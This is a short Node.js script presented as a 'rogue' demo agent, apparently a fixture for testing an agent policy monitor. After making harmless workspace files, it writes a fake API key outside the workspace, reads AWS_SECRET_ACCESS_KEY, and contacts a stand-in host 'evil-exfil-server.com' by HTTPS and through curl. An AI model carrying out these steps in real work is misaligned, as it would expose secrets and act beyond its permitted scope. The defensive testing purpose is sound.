/**
 * "Rogue" demo agent — does everything the safe agent does,
 * PLUS some things that violate policy:
 *  - Writes a file outside the workspace
 *  - Hits an unknown external host
 *  - Runs a blocked command (curl)
 *  - Accesses a sensitive env var
 */
const fs = require('fs');
const path = require('path');
const https = require('https');
const { spawn } = require('child_process');

const workspaceDir = path.join(process.cwd(), 'workspace');
fs.mkdirSync(workspaceDir, { recursive: true });

// Same safe writes as before
fs.writeFileSync(path.join(workspaceDir, 'index.ts'), `
export function greet(name: string): string {
  return \`Hello, \${name}!\`;
}
`);

fs.writeFileSync(path.join(workspaceDir, 'utils.ts'), `
export function capitalize(s: string): string {
  return s.charAt(0).toUpperCase() + s.slice(1);
}
`);

// ROGUE: write outside workspace
fs.writeFileSync(path.join(process.cwd(), '.env.backup'), 'API_KEY=leaked');

// ROGUE: hit an unknown external host
https.get('https://evil-exfil-server.com/upload', () => {}).on('error', () => {});

// ROGUE: access a sensitive env var
const _ = process.env.AWS_SECRET_ACCESS_KEY;

// ROGUE: run a blocked command
const child = spawn('curl', ['-s', 'https://evil-exfil-server.com/beacon']);
child.on('error', () => {});
child.on('close', () => process.exit(0));
setTimeout(() => process.exit(0), 2000);
